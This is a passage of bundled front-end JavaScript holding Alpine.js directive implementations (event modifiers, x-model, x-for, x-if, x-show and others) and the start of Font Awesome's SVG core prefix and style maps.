      let nextModifier = modifiers[modifiers.indexOf("debounce") + 1] || "invalid-wait";
      let wait = isNumeric(nextModifier.split("ms")[0]) ? Number(nextModifier.split("ms")[0]) : 250;
      handler4 = debounce(handler4, wait);
    }
    if (modifiers.includes("throttle")) {
      let nextModifier = modifiers[modifiers.indexOf("throttle") + 1] || "invalid-wait";
      let wait = isNumeric(nextModifier.split("ms")[0]) ? Number(nextModifier.split("ms")[0]) : 250;
      handler4 = throttle(handler4, wait);
    }
    if (modifiers.includes("prevent"))
      handler4 = wrapHandler(handler4, (next, e) => {
        e.preventDefault();
        next(e);
      });
    if (modifiers.includes("stop"))
      handler4 = wrapHandler(handler4, (next, e) => {
        e.stopPropagation();
        next(e);
      });
    if (modifiers.includes("once")) {
      handler4 = wrapHandler(handler4, (next, e) => {
        next(e);
        listenerTarget.removeEventListener(event, handler4, options);
      });
    }
    if (modifiers.includes("away") || modifiers.includes("outside")) {
      listenerTarget = document;
      handler4 = wrapHandler(handler4, (next, e) => {
        if (el.contains(e.target))
          return;
        if (e.target.isConnected === false)
          return;
        if (el.offsetWidth < 1 && el.offsetHeight < 1)
          return;
        if (el._x_isShown === false)
          return;
        next(e);
      });
    }
    if (modifiers.includes("self"))
      handler4 = wrapHandler(handler4, (next, e) => {
        e.target === el && next(e);
      });
    if (isKeyEvent(event) || isClickEvent(event)) {
      handler4 = wrapHandler(handler4, (next, e) => {
        if (isListeningForASpecificKeyThatHasntBeenPressed(e, modifiers)) {
          return;
        }
        next(e);
      });
    }
    listenerTarget.addEventListener(event, handler4, options);
    return () => {
      listenerTarget.removeEventListener(event, handler4, options);
    };
  }
  function dotSyntax(subject) {
    return subject.replace(/-/g, ".");
  }
  function camelCase2(subject) {
    return subject.toLowerCase().replace(/-(\w)/g, (match, char) => char.toUpperCase());
  }
  function isNumeric(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
  }
  function kebabCase2(subject) {
    if ([" ", "_"].includes(
      subject
    ))
      return subject;
    return subject.replace(/([a-z])([A-Z])/g, "$1-$2").replace(/[_\s]/, "-").toLowerCase();
  }
  function isKeyEvent(event) {
    return ["keydown", "keyup"].includes(event);
  }
  function isClickEvent(event) {
    return ["contextmenu", "click", "mouse"].some((i) => event.includes(i));
  }
  function isListeningForASpecificKeyThatHasntBeenPressed(e, modifiers) {
    let keyModifiers = modifiers.filter((i) => {
      return !["window", "document", "prevent", "stop", "once", "capture", "self", "away", "outside", "passive"].includes(i);
    });
    if (keyModifiers.includes("debounce")) {
      let debounceIndex = keyModifiers.indexOf("debounce");
      keyModifiers.splice(debounceIndex, isNumeric((keyModifiers[debounceIndex + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1);
    }
    if (keyModifiers.includes("throttle")) {
      let debounceIndex = keyModifiers.indexOf("throttle");
      keyModifiers.splice(debounceIndex, isNumeric((keyModifiers[debounceIndex + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1);
    }
    if (keyModifiers.length === 0)
      return false;
    if (keyModifiers.length === 1 && keyToModifiers(e.key).includes(keyModifiers[0]))
      return false;
    const systemKeyModifiers = ["ctrl", "shift", "alt", "meta", "cmd", "super"];
    const selectedSystemKeyModifiers = systemKeyModifiers.filter((modifier) => keyModifiers.includes(modifier));
    keyModifiers = keyModifiers.filter((i) => !selectedSystemKeyModifiers.includes(i));
    if (selectedSystemKeyModifiers.length > 0) {
      const activelyPressedKeyModifiers = selectedSystemKeyModifiers.filter((modifier) => {
        if (modifier === "cmd" || modifier === "super")
          modifier = "meta";
        return e[`${modifier}Key`];
      });
      if (activelyPressedKeyModifiers.length === selectedSystemKeyModifiers.length) {
        if (isClickEvent(e.type))
          return false;
        if (keyToModifiers(e.key).includes(keyModifiers[0]))
          return false;
      }
    }
    return true;
  }
  function keyToModifiers(key) {
    if (!key)
      return [];
    key = kebabCase2(key);
    let modifierToKeyMap = {
      "ctrl": "control",
      "slash": "/",
      "space": " ",
      "spacebar": " ",
      "cmd": "meta",
      "esc": "escape",
      "up": "arrow-up",
      "down": "arrow-down",
      "left": "arrow-left",
      "right": "arrow-right",
      "period": ".",
      "comma": ",",
      "equal": "=",
      "minus": "-",
      "underscore": "_"
    };
    modifierToKeyMap[key] = key;
    return Object.keys(modifierToKeyMap).map((modifier) => {
      if (modifierToKeyMap[modifier] === key)
        return modifier;
    }).filter((modifier) => modifier);
  }
  directive("model", (el, { modifiers, expression }, { effect: effect3, cleanup: cleanup2 }) => {
    let scopeTarget = el;
    if (modifiers.includes("parent")) {
      scopeTarget = el.parentNode;
    }
    let evaluateGet = evaluateLater(scopeTarget, expression);
    let evaluateSet;
    if (typeof expression === "string") {
      evaluateSet = evaluateLater(scopeTarget, `${expression} = __placeholder`);
    } else if (typeof expression === "function" && typeof expression() === "string") {
      evaluateSet = evaluateLater(scopeTarget, `${expression()} = __placeholder`);
    } else {
      evaluateSet = () => {
      };
    }
    let getValue = () => {
      let result;
      evaluateGet((value) => result = value);
      return isGetterSetter(result) ? result.get() : result;
    };
    let setValue = (value) => {
      let result;
      evaluateGet((value2) => result = value2);
      if (isGetterSetter(result)) {
        result.set(value);
      } else {
        evaluateSet(() => {
        }, {
          scope: { "__placeholder": value }
        });
      }
    };
    if (typeof expression === "string" && el.type === "radio") {
      mutateDom(() => {
        if (!el.hasAttribute("name"))
          el.setAttribute("name", expression);
      });
    }
    var event = el.tagName.toLowerCase() === "select" || ["checkbox", "radio"].includes(el.type) || modifiers.includes("lazy") ? "change" : "input";
    let removeListener = isCloning ? () => {
    } : on(el, event, modifiers, (e) => {
      setValue(getInputValue(el, modifiers, e, getValue()));
    });
    if (modifiers.includes("fill")) {
      if ([void 0, null, ""].includes(getValue()) || el.type === "checkbox" && Array.isArray(getValue()) || el.tagName.toLowerCase() === "select" && el.multiple) {
        setValue(
          getInputValue(el, modifiers, { target: el }, getValue())
        );
      }
    }
    if (!el._x_removeModelListeners)
      el._x_removeModelListeners = {};
    el._x_removeModelListeners["default"] = removeListener;
    cleanup2(() => el._x_removeModelListeners["default"]());
    if (el.form) {
      let removeResetListener = on(el.form, "reset", [], (e) => {
        nextTick(() => el._x_model && el._x_model.set(getInputValue(el, modifiers, { target: el }, getValue())));
      });
      cleanup2(() => removeResetListener());
    }
    el._x_model = {
      get() {
        return getValue();
      },
      set(value) {
        setValue(value);
      }
    };
    el._x_forceModelUpdate = (value) => {
      if (value === void 0 && typeof expression === "string" && expression.match(/\./))
        value = "";
      window.fromModel = true;
      mutateDom(() => bind(el, "value", value));
      delete window.fromModel;
    };
    effect3(() => {
      let value = getValue();
      if (modifiers.includes("unintrusive") && document.activeElement.isSameNode(el))
        return;
      el._x_forceModelUpdate(value);
    });
  });
  function getInputValue(el, modifiers, event, currentValue) {
    return mutateDom(() => {
      if (event instanceof CustomEvent && event.detail !== void 0)
        return event.detail !== null && event.detail !== void 0 ? event.detail : event.target.value;
      else if (el.type === "checkbox") {
        if (Array.isArray(currentValue)) {
          let newValue = null;
          if (modifiers.includes("number")) {
            newValue = safeParseNumber(event.target.value);
          } else if (modifiers.includes("boolean")) {
            newValue = safeParseBoolean(event.target.value);
          } else {
            newValue = event.target.value;
          }
          return event.target.checked ? currentValue.includes(newValue) ? currentValue : currentValue.concat([newValue]) : currentValue.filter((el2) => !checkedAttrLooseCompare2(el2, newValue));
        } else {
          return event.target.checked;
        }
      } else if (el.tagName.toLowerCase() === "select" && el.multiple) {
        if (modifiers.includes("number")) {
          return Array.from(event.target.selectedOptions).map((option) => {
            let rawValue = option.value || option.text;
            return safeParseNumber(rawValue);
          });
        } else if (modifiers.includes("boolean")) {
          return Array.from(event.target.selectedOptions).map((option) => {
            let rawValue = option.value || option.text;
            return safeParseBoolean(rawValue);
          });
        }
        return Array.from(event.target.selectedOptions).map((option) => {
          return option.value || option.text;
        });
      } else {
        let newValue;
        if (el.type === "radio") {
          if (event.target.checked) {
            newValue = event.target.value;
          } else {
            newValue = currentValue;
          }
        } else {
          newValue = event.target.value;
        }
        if (modifiers.includes("number")) {
          return safeParseNumber(newValue);
        } else if (modifiers.includes("boolean")) {
          return safeParseBoolean(newValue);
        } else if (modifiers.includes("trim")) {
          return newValue.trim();
        } else {
          return newValue;
        }
      }
    });
  }
  function safeParseNumber(rawValue) {
    let number = rawValue ? parseFloat(rawValue) : null;
    return isNumeric2(number) ? number : rawValue;
  }
  function checkedAttrLooseCompare2(valueA, valueB) {
    return valueA == valueB;
  }
  function isNumeric2(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
  }
  function isGetterSetter(value) {
    return value !== null && typeof value === "object" && typeof value.get === "function" && typeof value.set === "function";
  }
  directive("cloak", (el) => queueMicrotask(() => mutateDom(() => el.removeAttribute(prefix("cloak")))));
  addInitSelector(() => `[${prefix("init")}]`);
  directive("init", skipDuringClone((el, { expression }, { evaluate: evaluate2 }) => {
    if (typeof expression === "string") {
      return !!expression.trim() && evaluate2(expression, {}, false);
    }
    return evaluate2(expression, {}, false);
  }));
  directive("text", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2 }) => {
    let evaluate2 = evaluateLater2(expression);
    effect3(() => {
      evaluate2((value) => {
        mutateDom(() => {
          el.textContent = value;
        });
      });
    });
  });
  directive("html", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2 }) => {
    let evaluate2 = evaluateLater2(expression);
    effect3(() => {
      evaluate2((value) => {
        mutateDom(() => {
          el.innerHTML = value;
          el._x_ignoreSelf = true;
          initTree(el);
          delete el._x_ignoreSelf;
        });
      });
    });
  });
  mapAttributes(startingWith(":", into(prefix("bind:"))));
  var handler2 = (el, { value, modifiers, expression, original }, { effect: effect3, cleanup: cleanup2 }) => {
    if (!value) {
      let bindingProviders = {};
      injectBindingProviders(bindingProviders);
      let getBindings = evaluateLater(el, expression);
      getBindings((bindings) => {
        applyBindingsObject(el, bindings, original);
      }, { scope: bindingProviders });
      return;
    }
    if (value === "key")
      return storeKeyForXFor(el, expression);
    if (el._x_inlineBindings && el._x_inlineBindings[value] && el._x_inlineBindings[value].extract) {
      return;
    }
    let evaluate2 = evaluateLater(el, expression);
    effect3(() => evaluate2((result) => {
      if (result === void 0 && typeof expression === "string" && expression.match(/\./)) {
        result = "";
      }
      mutateDom(() => bind(el, value, result, modifiers));
    }));
    cleanup2(() => {
      el._x_undoAddedClasses && el._x_undoAddedClasses();
      el._x_undoAddedStyles && el._x_undoAddedStyles();
    });
  };
  handler2.inline = (el, { value, modifiers, expression }) => {
    if (!value)
      return;
    if (!el._x_inlineBindings)
      el._x_inlineBindings = {};
    el._x_inlineBindings[value] = { expression, extract: false };
  };
  directive("bind", handler2);
  function storeKeyForXFor(el, expression) {
    el._x_keyExpression = expression;
  }
  addRootSelector(() => `[${prefix("data")}]`);
  directive("data", (el, { expression }, { cleanup: cleanup2 }) => {
    if (shouldSkipRegisteringDataDuringClone(el))
      return;
    expression = expression === "" ? "{}" : expression;
    let magicContext = {};
    injectMagics(magicContext, el);
    let dataProviderContext = {};
    injectDataProviders(dataProviderContext, magicContext);
    let data2 = evaluate(el, expression, { scope: dataProviderContext });
    if (data2 === void 0 || data2 === true)
      data2 = {};
    injectMagics(data2, el);
    let reactiveData = reactive(data2);
    initInterceptors(reactiveData);
    let undo = addScopeToNode(el, reactiveData);
    reactiveData["init"] && evaluate(el, reactiveData["init"]);
    cleanup2(() => {
      reactiveData["destroy"] && evaluate(el, reactiveData["destroy"]);
      undo();
    });
  });
  interceptClone((from, to) => {
    if (from._x_dataStack) {
      to._x_dataStack = from._x_dataStack;
      to.setAttribute("data-has-alpine-state", true);
    }
  });
  function shouldSkipRegisteringDataDuringClone(el) {
    if (!isCloning)
      return false;
    if (isCloningLegacy)
      return true;
    return el.hasAttribute("data-has-alpine-state");
  }
  directive("show", (el, { modifiers, expression }, { effect: effect3 }) => {
    let evaluate2 = evaluateLater(el, expression);
    if (!el._x_doHide)
      el._x_doHide = () => {
        mutateDom(() => {
          el.style.setProperty("display", "none", modifiers.includes("important") ? "important" : void 0);
        });
      };
    if (!el._x_doShow)
      el._x_doShow = () => {
        mutateDom(() => {
          if (el.style.length === 1 && el.style.display === "none") {
            el.removeAttribute("style");
          } else {
            el.style.removeProperty("display");
          }
        });
      };
    let hide = () => {
      el._x_doHide();
      el._x_isShown = false;
    };
    let show = () => {
      el._x_doShow();
      el._x_isShown = true;
    };
    let clickAwayCompatibleShow = () => setTimeout(show);
    let toggle = once(
      (value) => value ? show() : hide(),
      (value) => {
        if (typeof el._x_toggleAndCascadeWithTransitions === "function") {
          el._x_toggleAndCascadeWithTransitions(el, value, show, hide);
        } else {
          value ? clickAwayCompatibleShow() : hide();
        }
      }
    );
    let oldValue;
    let firstTime = true;
    effect3(() => evaluate2((value) => {
      if (!firstTime && value === oldValue)
        return;
      if (modifiers.includes("immediate"))
        value ? clickAwayCompatibleShow() : hide();
      toggle(value);
      oldValue = value;
      firstTime = false;
    }));
  });
  directive("for", (el, { expression }, { effect: effect3, cleanup: cleanup2 }) => {
    let iteratorNames = parseForExpression(expression);
    let evaluateItems = evaluateLater(el, iteratorNames.items);
    let evaluateKey = evaluateLater(
      el,
      // the x-bind:key expression is stored for our use instead of evaluated.
      el._x_keyExpression || "index"
    );
    el._x_prevKeys = [];
    el._x_lookup = {};
    effect3(() => loop(el, iteratorNames, evaluateItems, evaluateKey));
    cleanup2(() => {
      Object.values(el._x_lookup).forEach((el2) => el2.remove());
      delete el._x_prevKeys;
      delete el._x_lookup;
    });
  });
  function loop(el, iteratorNames, evaluateItems, evaluateKey) {
    let isObject2 = (i) => typeof i === "object" && !Array.isArray(i);
    let templateEl = el;
    evaluateItems((items) => {
      if (isNumeric3(items) && items >= 0) {
        items = Array.from(Array(items).keys(), (i) => i + 1);
      }
      if (items === void 0)
        items = [];
      let lookup = el._x_lookup;
      let prevKeys = el._x_prevKeys;
      let scopes = [];
      let keys = [];
      if (isObject2(items)) {
        items = Object.entries(items).map(([key, value]) => {
          let scope2 = getIterationScopeVariables(iteratorNames, value, key, items);
          evaluateKey((value2) => {
            if (keys.includes(value2))
              warn("Duplicate key on x-for", el);
            keys.push(value2);
          }, { scope: { index: key, ...scope2 } });
          scopes.push(scope2);
        });
      } else {
        for (let i = 0; i < items.length; i++) {
          let scope2 = getIterationScopeVariables(iteratorNames, items[i], i, items);
          evaluateKey((value) => {
            if (keys.includes(value))
              warn("Duplicate key on x-for", el);
            keys.push(value);
          }, { scope: { index: i, ...scope2 } });
          scopes.push(scope2);
        }
      }
      let adds = [];
      let moves = [];
      let removes = [];
      let sames = [];
      for (let i = 0; i < prevKeys.length; i++) {
        let key = prevKeys[i];
        if (keys.indexOf(key) === -1)
          removes.push(key);
      }
      prevKeys = prevKeys.filter((key) => !removes.includes(key));
      let lastKey = "template";
      for (let i = 0; i < keys.length; i++) {
        let key = keys[i];
        let prevIndex = prevKeys.indexOf(key);
        if (prevIndex === -1) {
          prevKeys.splice(i, 0, key);
          adds.push([lastKey, i]);
        } else if (prevIndex !== i) {
          let keyInSpot = prevKeys.splice(i, 1)[0];
          let keyForSpot = prevKeys.splice(prevIndex - 1, 1)[0];
          prevKeys.splice(i, 0, keyForSpot);
          prevKeys.splice(prevIndex, 0, keyInSpot);
          moves.push([keyInSpot, keyForSpot]);
        } else {
          sames.push(key);
        }
        lastKey = key;
      }
      for (let i = 0; i < removes.length; i++) {
        let key = removes[i];
        if (!!lookup[key]._x_effects) {
          lookup[key]._x_effects.forEach(dequeueJob);
        }
        lookup[key].remove();
        lookup[key] = null;
        delete lookup[key];
      }
      for (let i = 0; i < moves.length; i++) {
        let [keyInSpot, keyForSpot] = moves[i];
        let elInSpot = lookup[keyInSpot];
        let elForSpot = lookup[keyForSpot];
        let marker = document.createElement("div");
        mutateDom(() => {
          if (!elForSpot)
            warn(`x-for ":key" is undefined or invalid`, templateEl, keyForSpot, lookup);
          elForSpot.after(marker);
          elInSpot.after(elForSpot);
          elForSpot._x_currentIfEl && elForSpot.after(elForSpot._x_currentIfEl);
          marker.before(elInSpot);
          elInSpot._x_currentIfEl && elInSpot.after(elInSpot._x_currentIfEl);
          marker.remove();
        });
        elForSpot._x_refreshXForScope(scopes[keys.indexOf(keyForSpot)]);
      }
      for (let i = 0; i < adds.length; i++) {
        let [lastKey2, index] = adds[i];
        let lastEl = lastKey2 === "template" ? templateEl : lookup[lastKey2];
        if (lastEl._x_currentIfEl)
          lastEl = lastEl._x_currentIfEl;
        let scope2 = scopes[index];
        let key = keys[index];
        let clone2 = document.importNode(templateEl.content, true).firstElementChild;
        let reactiveScope = reactive(scope2);
        addScopeToNode(clone2, reactiveScope, templateEl);
        clone2._x_refreshXForScope = (newScope) => {
          Object.entries(newScope).forEach(([key2, value]) => {
            reactiveScope[key2] = value;
          });
        };
        mutateDom(() => {
          lastEl.after(clone2);
          skipDuringClone(() => initTree(clone2))();
        });
        if (typeof key === "object") {
          warn("x-for key cannot be an object, it must be a string or an integer", templateEl);
        }
        lookup[key] = clone2;
      }
      for (let i = 0; i < sames.length; i++) {
        lookup[sames[i]]._x_refreshXForScope(scopes[keys.indexOf(sames[i])]);
      }
      templateEl._x_prevKeys = keys;
    });
  }
  function parseForExpression(expression) {
    let forIteratorRE = /,([^,\}\]]*)(?:,([^,\}\]]*))?$/;
    let stripParensRE = /^\s*\(|\)\s*$/g;
    let forAliasRE = /([\s\S]*?)\s+(?:in|of)\s+([\s\S]*)/;
    let inMatch = expression.match(forAliasRE);
    if (!inMatch)
      return;
    let res = {};
    res.items = inMatch[2].trim();
    let item = inMatch[1].replace(stripParensRE, "").trim();
    let iteratorMatch = item.match(forIteratorRE);
    if (iteratorMatch) {
      res.item = item.replace(forIteratorRE, "").trim();
      res.index = iteratorMatch[1].trim();
      if (iteratorMatch[2]) {
        res.collection = iteratorMatch[2].trim();
      }
    } else {
      res.item = item;
    }
    return res;
  }
  function getIterationScopeVariables(iteratorNames, item, index, items) {
    let scopeVariables = {};
    if (/^\[.*\]$/.test(iteratorNames.item) && Array.isArray(item)) {
      let names = iteratorNames.item.replace("[", "").replace("]", "").split(",").map((i) => i.trim());
      names.forEach((name, i) => {
        scopeVariables[name] = item[i];
      });
    } else if (/^\{.*\}$/.test(iteratorNames.item) && !Array.isArray(item) && typeof item === "object") {
      let names = iteratorNames.item.replace("{", "").replace("}", "").split(",").map((i) => i.trim());
      names.forEach((name) => {
        scopeVariables[name] = item[name];
      });
    } else {
      scopeVariables[iteratorNames.item] = item;
    }
    if (iteratorNames.index)
      scopeVariables[iteratorNames.index] = index;
    if (iteratorNames.collection)
      scopeVariables[iteratorNames.collection] = items;
    return scopeVariables;
  }
  function isNumeric3(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
  }
  function handler3() {
  }
  handler3.inline = (el, { expression }, { cleanup: cleanup2 }) => {
    let root = closestRoot(el);
    if (!root._x_refs)
      root._x_refs = {};
    root._x_refs[expression] = el;
    cleanup2(() => delete root._x_refs[expression]);
  };
  directive("ref", handler3);
  directive("if", (el, { expression }, { effect: effect3, cleanup: cleanup2 }) => {
    if (el.tagName.toLowerCase() !== "template")
      warn("x-if can only be used on a <template> tag", el);
    let evaluate2 = evaluateLater(el, expression);
    let show = () => {
      if (el._x_currentIfEl)
        return el._x_currentIfEl;
      let clone2 = el.content.cloneNode(true).firstElementChild;
      addScopeToNode(clone2, {}, el);
      mutateDom(() => {
        el.after(clone2);
        skipDuringClone(() => initTree(clone2))();
      });
      el._x_currentIfEl = clone2;
      el._x_undoIf = () => {
        walk(clone2, (node) => {
          if (!!node._x_effects) {
            node._x_effects.forEach(dequeueJob);
          }
        });
        clone2.remove();
        delete el._x_currentIfEl;
      };
      return clone2;
    };
    let hide = () => {
      if (!el._x_undoIf)
        return;
      el._x_undoIf();
      delete el._x_undoIf;
    };
    effect3(() => evaluate2((value) => {
      value ? show() : hide();
    }));
    cleanup2(() => el._x_undoIf && el._x_undoIf());
  });
  directive("id", (el, { expression }, { evaluate: evaluate2 }) => {
    let names = evaluate2(expression);
    names.forEach((name) => setIdRoot(el, name));
  });
  interceptClone((from, to) => {
    if (from._x_ids) {
      to._x_ids = from._x_ids;
    }
  });
  mapAttributes(startingWith("@", into(prefix("on:"))));
  directive("on", skipDuringClone((el, { value, modifiers, expression }, { cleanup: cleanup2 }) => {
    let evaluate2 = expression ? evaluateLater(el, expression) : () => {
    };
    if (el.tagName.toLowerCase() === "template") {
      if (!el._x_forwardEvents)
        el._x_forwardEvents = [];
      if (!el._x_forwardEvents.includes(value))
        el._x_forwardEvents.push(value);
    }
    let removeListener = on(el, value, modifiers, (e) => {
      evaluate2(() => {
      }, { scope: { "$event": e }, params: [e] });
    });
    cleanup2(() => removeListener());
  }));
  warnMissingPluginDirective("Collapse", "collapse", "collapse");
  warnMissingPluginDirective("Intersect", "intersect", "intersect");
  warnMissingPluginDirective("Focus", "trap", "focus");
  warnMissingPluginDirective("Mask", "mask", "mask");
  function warnMissingPluginDirective(name, directiveName, slug) {
    directive(directiveName, (el) => warn(`You can't use [x-${directiveName}] without first installing the "${name}" plugin here: https://alpinejs.dev/plugins/${slug}`, el));
  }
  alpine_default.setEvaluator(normalEvaluator);
  alpine_default.setReactivityEngine({ reactive: reactive2, effect: effect2, release: stop, raw: toRaw });
  var src_default = alpine_default;
  var module_default = src_default;

  // node_modules/@fortawesome/fontawesome-svg-core/index.mjs
  var noop = () => {
  };
  var _WINDOW = {};
  var _DOCUMENT = {};
  var _MUTATION_OBSERVER = null;
  var _PERFORMANCE = {
    mark: noop,
    measure: noop
  };
  try {
    if (typeof window !== "undefined") _WINDOW = window;
    if (typeof document !== "undefined") _DOCUMENT = document;
    if (typeof MutationObserver !== "undefined") _MUTATION_OBSERVER = MutationObserver;
    if (typeof performance !== "undefined") _PERFORMANCE = performance;
  } catch (e) {
  }
  var {
    userAgent = ""
  } = _WINDOW.navigator || {};
  var WINDOW = _WINDOW;
  var DOCUMENT = _DOCUMENT;
  var MUTATION_OBSERVER = _MUTATION_OBSERVER;
  var PERFORMANCE = _PERFORMANCE;
  var IS_BROWSER = !!WINDOW.document;
  var IS_DOM = !!DOCUMENT.documentElement && !!DOCUMENT.head && typeof DOCUMENT.addEventListener === "function" && typeof DOCUMENT.createElement === "function";
  var IS_IE = ~userAgent.indexOf("MSIE") || ~userAgent.indexOf("Trident/");
  var a = "classic";
  var t = "duotone";
  var r = "sharp";
  var o = "sharp-duotone";
  var c = [a, t, r, o];
  var et$1 = {
    classic: {
      900: "fas",
      400: "far",
      normal: "far",
      300: "fal",
      100: "fat"
    },
    sharp: {
      900: "fass",
      400: "fasr",
      300: "fasl",
      100: "fast"
    },
    "sharp-duotone": {
      900: "fasds"
    }
  };
  var bt = {
    kit: {
      fak: "kit",
      "fa-kit": "kit"
    },
    "kit-duotone": {
      fakd: "kit-duotone",
      "fa-kit-duotone": "kit-duotone"
    }
  };
  var Ct = ["kit"];
  var Dt = /fa(s|r|l|t|d|b|k|kd|ss|sr|sl|st|sds)?[\-\ ]/;
  var Kt = /Font ?Awesome ?([56 ]*)(Solid|Regular|Light|Thin|Duotone|Brands|Free|Pro|Sharp Duotone|Sharp|Kit)?.*/i;
  var ao = {
    "Font Awesome 5 Free": {
      900: "fas",
      400: "far"
    },
    "Font Awesome 5 Pro": {
      900: "fas",
      400: "far",
      normal: "far",
      300: "fal"
    },
    "Font Awesome 5 Brands": {
      400: "fab",
      normal: "fab"
    },
    "Font Awesome 5 Duotone": {
      900: "fad"
    }
  };
  var eo = {
    "Font Awesome 6 Free": {
      900: "fas",
      400: "far"
    },
    "Font Awesome 6 Pro": {
      900: "fas",
      400: "far",
      normal: "far",
      300: "fal",
      100: "fat"
    },
    "Font Awesome 6 Brands": {
      400: "fab",
      normal: "fab"
    },
    "Font Awesome 6 Duotone": {
      900: "fad"
    },
    "Font Awesome 6 Sharp": {
      900: "fass",
      400: "fasr",
      normal: "fasr",
      300: "fasl",
      100: "fast"
    },
    "Font Awesome 6 Sharp Duotone": {
      900: "fasds"
    }
  };
  var lo = {
    classic: {
      "fa-brands": "fab",
      "fa-duotone": "fad",
      "fa-light": "fal",
      "fa-regular": "far",
      "fa-solid": "fas",
      "fa-thin": "fat"
    },
    sharp: {
      "fa-solid": "fass",
      "fa-regular": "fasr",
      "fa-light": "fasl",
      "fa-thin": "fast"
    },
    "sharp-duotone": {
      "fa-solid": "fasds"
    }
  };
  var y = {
    classic: ["fas", "far", "fal", "fat"],
    sharp: ["fass", "fasr", "fasl", "fast"],
    "sharp-duotone": ["fasds"]
  };
  var no = {
    classic: {
      fab: "fa-brands",
      fad: "fa-duotone",
      fal: "fa-light",
      far: "fa-regular",
      fas: "fa-solid",
      fat: "fa-thin"
    },
    sharp: {
      fass: "fa-solid",
      fasr: "fa-regular",
      fasl: "fa-light",
      fast: "fa-thin"
    },
    "sharp-duotone": {
      fasds: "fa-solid"
    }
  };
  var fo = {
    classic: {
      solid: "fas",
      regular: "far",
      light: "fal",
      thin: "fat",
      duotone: "fad",
      brands: "fab"
    },
    sharp: {
      solid: "fass",
      regular: "fasr",
      light: "fasl",
      thin: "fast"
    },
    "sharp-duotone": {
      solid: "fasds"
    }
  };
  var ho = {
    classic: {
      fa: "solid",
      fas: "solid",
      "fa-solid": "solid",
      far: "regular",
      "fa-regular": "regular",
      fal: "light",
      "fa-light": "light",
      fat: "thin",
      "fa-thin": "thin",
      fad: "duotone",
      "fa-duotone": "duotone",
      fab: "brands",
      "fa-brands": "brands"
    },
    sharp: {
      fa: "solid",
      fass: "solid",
      "fa-solid": "solid",
      fasr: "regular",
      "fa-regular": "regular",
      fasl: "light",
      "fa-light": "light",
      fast: "thin",
      "fa-thin": "thin"
    },
    "sharp-duotone": {
      fa: "solid",
      fasds: "solid",
      "fa-solid": "solid"
    }
  };
  var x$1 = ["solid", "regular", "light", "thin", "duotone", "brands"];
  var u$1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
  var m$1 = u$1.concat([11, 12, 13, 14, 15, 16, 17, 18, 19, 20]);
  var t$1 = {
    GROUP: "duotone-group",
    SWAP_OPACITY: "swap-opacity",
    PRIMARY: "primary",
    SECONDARY: "secondary"
  };
  var yo = [...Object.keys(y), ...x$1, "2xs", "xs", "sm", "lg", "xl", "2xl", "beat", "border", "fade", "beat-fade", "bounce", "flip-both", "flip-horizontal", "flip-vertical", "flip", "fw", "inverse", "layers-counter", "layers-text", "layers", "li", "pull-left", "pull-right", "pulse", "rotate-180", "rotate-270", "rotate-90", "rotate-by", "shake", "spin-pulse", "spin-reverse", "spin", "stack-1x", "stack-2x", "stack", "ul", t$1.GROUP, t$1.SWAP_OPACITY, t$1.PRIMARY, t$1.SECONDARY].concat(u$1.map((o2) => "".concat(o2, "x"))).concat(m$1.map((o2) => "w-".concat(o2)));
  var mo = {
    "Font Awesome Kit": {
      400: "fak",
      normal: "fak"
    },
    "Font Awesome Kit Duotone": {
      400: "fakd",
      normal: "fakd"
    }
  };
  var Io = {
    kit: {
      "fa-kit": "fak"
    },
    "kit-duotone": {
      "fa-kit-duotone": "fakd"
    }
  };
  var Fo = {
    kit: {
      fak: "fa-kit"
    },
    "kit-duotone": {
      fakd: "fa-kit-duotone"
    }
  };
  var So = {
    kit: {
      kit: "fak"
    },
    "kit-duotone": {
      "kit-duotone": "fakd"
    }
  };
  var NAMESPACE_IDENTIFIER = "___FONT_AWESOME___";
  var UNITS_IN_GRID = 16;
  var DEFAULT_CSS_PREFIX = "fa";
  var DEFAULT_REPLACEMENT_CLASS = "svg-inline--fa";
  var DATA_FA_I2SVG = "data-fa-i2svg";
  var DATA_FA_PSEUDO_ELEMENT = "data-fa-pseudo-element";
  var DATA_FA_PSEUDO_ELEMENT_PENDING = "data-fa-pseudo-element-pending";
  var DATA_PREFIX = "data-prefix";
  var DATA_ICON = "data-icon";
  var HTML_CLASS_I2SVG_BASE_CLASS = "fontawesome-i2svg";
  var MUTATION_APPROACH_ASYNC = "async";
  var TAGNAMES_TO_SKIP_FOR_PSEUDOELEMENTS = ["HTML", "HEAD", "STYLE", "SCRIPT"];
  var PRODUCTION = (() => {
    try {
      return false;
    } catch (e$$1) {
      return false;
    }
  })();
  var FAMILIES = [a, r, o];
  function familyProxy(obj) {
    return new Proxy(obj, {
      get(target, prop) {
        return prop in target ? target[prop] : target[a];
      }
    });
  }
  var _PREFIX_TO_STYLE = {
    ...ho
  };
  _PREFIX_TO_STYLE[a] = {
    ...ho[a],
    ...bt["kit"],
    ...bt["kit-duotone"]
  };
  var PREFIX_TO_STYLE = familyProxy(_PREFIX_TO_STYLE);
  var _STYLE_TO_PREFIX = {
    ...fo
  };
  _STYLE_TO_PREFIX[a] = {
    ..._STYLE_TO_PREFIX[a],
    ...So["kit"],
    ...So["kit-duotone"]
  };
  var STYLE_TO_PREFIX = familyProxy(_STYLE_TO_PREFIX);
  var _PREFIX_TO_LONG_STYLE = {
    ...no
  };
  _PREFIX_TO_LONG_STYLE[a] = {
    ..._PREFIX_TO_LONG_STYLE[a],
    ...Fo["kit"]
  };
  var PREFIX_TO_LONG_STYLE = familyProxy(_PREFIX_TO_LONG_STYLE);
  var _LONG_STYLE_TO_PREFIX = {
    ...lo
  };
  _LONG_STYLE_TO_PREFIX[a] = {
    ..._LONG_STYLE_TO_PREFIX[a],
    ...Io["kit"]
  };
  var LONG_STYLE_TO_PREFIX = familyProxy(_LONG_STYLE_TO_PREFIX);
  var ICON_SELECTION_SYNTAX_PATTERN = Dt;
  var LAYERS_TEXT_CLASSNAME = "fa-layers-text";
  var FONT_FAMILY_PATTERN = Kt;
  var _FONT_WEIGHT_TO_PREFIX = {
    ...et$1
  };
  var FONT_WEIGHT_TO_PREFIX = familyProxy(_FONT_WEIGHT_TO_PREFIX);
